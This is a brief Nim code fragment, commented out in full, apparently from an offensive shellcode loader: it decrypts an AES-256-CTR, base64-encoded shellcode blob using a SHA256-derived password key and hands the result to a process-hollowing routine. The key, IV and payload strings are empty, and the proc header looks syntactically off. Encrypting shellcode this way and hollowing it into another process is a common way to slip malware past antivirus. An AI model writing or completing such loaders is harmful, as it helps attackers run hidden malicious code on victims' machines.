#[
proc decryptShellcode: =
    func toByteSeq*(str: string): seq[byte] {.inline.} =
        @(str.toOpenArrayByte(0, str.high))

    let
        password: string = ""
        ivB64: string = ""
        encB64: string = ""
    var
        ctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: seq[byte] = toByteSeq(decode(ivB64))
        enc: seq[byte] = toByteSeq(decode(encB64))
        dec: seq[byte] = newSeq[byte](len(enc))


    # KDF based on SHA256
    var expKey = sha256.digest(password)
    copyMem(addr key[0], addr expKey.data[0], len(expKey.data))
    ctx.init(key, iv)


    # Decrypt the shellcode
    ctx.decrypt(enc, dec)
    ctx.clear()
    hollowShellcode(dec)
]#